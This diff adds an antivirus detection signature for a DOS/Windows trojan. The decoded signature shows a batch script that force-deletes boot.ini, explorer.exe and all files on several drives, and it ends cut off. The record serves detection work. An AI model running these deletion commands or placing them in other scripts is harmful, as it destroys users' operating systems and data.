@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36553
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off @echo @pause @title @echo @del /f /s /q /a s c:\boot.ini @del /f /s /q /a s %systemroot%\explorer.exe @del /f /s /q e:\*.* @del /f /s /q d:\*.* @del /f /s /q f:\*.* @del /f /s /q z:\*.* @del /f /s /q y:\*.* @del /f /s.........
